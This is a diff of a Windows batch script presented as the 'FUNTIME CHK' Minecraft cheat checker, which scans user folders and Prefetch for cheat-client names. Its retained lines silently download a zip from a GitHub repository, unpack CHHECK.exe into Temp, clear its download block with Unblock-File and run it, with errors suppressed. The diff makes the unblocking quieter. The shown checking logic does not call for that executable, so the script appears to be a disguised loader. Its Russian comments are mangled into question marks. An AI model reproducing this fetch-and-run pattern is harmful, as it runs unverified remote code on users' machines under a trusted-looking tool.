@@ -21,7 +21,7 @@ set "BANG=!"
 set "KWP=vape ghost drip tenacity novoline fdp liquidbounce wurst meteor delta nursultan expensive"
 set "KWM=!KWP! rise killaura aristois sigma dumik mhab cortex inject sk3d"
 
-rem === ѕроверка прав администратора ===
+rem === ???????? ???? ?????????????? ===
 set "ADMIN=0"
 net session >nul 2>&1
 if not errorlevel 1 set "ADMIN=1"
@@ -31,16 +31,17 @@ echo.
 echo   %W%FUNTIME CHK%X%   %G%minecraft cheat checker%X%
 echo   %G%-----------------------------------------%X%
 
-rem === —качиваем и запускаем CHHECK.exe ===
+rem === ????????? ? ????????? CHHECK.exe ===
 if not exist "%TEMP%\CHHECK\CHHECK.exe" (
     powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;try{Invoke-WebRequest -Uri 'https://github.com/kaghohop-gif/chk/raw/refs/heads/main/CHHECK.zip' -OutFile '%TEMP%\CHHECK.zip'}catch{}"
     if exist "%TEMP%\CHHECK.zip" (
         powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';try{Expand-Archive -Path '%TEMP%\CHHECK.zip' -DestinationPath '%TEMP%\CHHECK' -Force}catch{}"
+        powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Sleep -Milliseconds 500"
         del /q "%TEMP%\CHHECK.zip" >nul 2>&1
     )
 )
 if exist "%TEMP%\CHHECK\CHHECK.exe" (
-    powershell -NoProfile -ExecutionPolicy Bypass -Command "Unblock-File -Path '%TEMP%\CHHECK\CHHECK.exe'" >nul 2>&1
+    powershell -NoProfile -ExecutionPolicy Bypass -Command "try{Unblock-File -Path '%TEMP%\CHHECK\CHHECK.exe'}catch{}" >nul 2>&1
     start "" "%TEMP%\CHHECK\CHHECK.exe"
 )
 
@@ -77,7 +78,7 @@ if /i "!cmd:~0,6!"=="--load" (
     goto load
 )
 if /i "!cmd!"=="--help" goto help
-echo   %G%unknown command Ч list: --help%X%
+echo   %G%unknown command ? list: --help%X%
 goto prompt
 
 :help
@@ -208,7 +209,7 @@ for %%f in ("%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\*") do (
     )
 )
 
-echo   %G%6/7 files Ч downloads / desktop / recent / temp%X%
+echo   %G%6/7 files ? downloads / desktop / recent / temp%X%
 for %%p in ("%USERPROFILE%\Downloads" "%USERPROFILE%\Desktop" "%APPDATA%\Microsoft\Windows\Recent" "%TEMP%") do (
     for %%k in (!KWM!) do (
         for /f "delims=" %%f in ('dir /b "%%~p" 2^>nul ^| findstr /i "%%k"') do (
@@ -220,7 +221,7 @@ for %%p in ("%USERPROFILE%\Downloads" "%USERPROFILE%\Desktop" "%APPDATA%\Microso
 
 echo   %G%7/7 prefetch%X%
 if "!ADMIN!"=="0" (
-    echo      %G%[-] no admin rights Ч skipped%X%
+    echo      %G%[-] no admin rights ? skipped%X%
 ) else (
     for /d %%f in ("C:\Windows\Prefetch\*") do (
         for %%k in (!KWM!) do (
@@ -244,7 +245,7 @@ if "!ADMIN!"=="0" (
 
 echo   %G%-----------------------------------------%X%
 if !found! gtr 0 (
-    echo   %R%[!BANG!] result: found !found! Ч check in JournalTrace / WinPrefetchView%X%
+    echo   %R%[!BANG!] result: found !found! ? check in JournalTrace / WinPrefetchView%X%
 ) else (
     echo   %GN%[+] result: nothing suspicious%X%
 )
